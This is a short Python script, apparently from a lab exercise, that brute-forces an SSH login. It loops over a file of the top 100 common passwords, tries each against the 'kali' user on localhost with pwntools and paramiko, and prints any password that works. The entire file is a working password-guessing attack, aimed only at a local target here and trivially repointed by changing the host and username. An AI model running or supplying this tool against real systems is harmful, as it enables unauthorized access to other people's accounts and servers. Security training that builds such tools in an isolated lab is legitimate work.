from pwn import *
import paramiko
import subprocess
from sshd_configurator import SSH_Configurator
	
SSH_Configurator()
host = '127.0.0.1'
username = 'kali'
attempts = 0
verification = False

with open("top_100_passwords.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting Password: '{}'".format(attempts, password))
			response = ssh(host = host, user = username, password = password, timeout = 1)
			if response.connected():
			 print("\n [>]Congrats!^_^ \n [>] Valid password found: '{}' ".format(password))
			 verification = True
			 response.close()
			 break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid Password: '{}'".format(password))
		attempts +=1

if verification == False:
	print('[!] Sorry, but the password is not in the given list @_@')
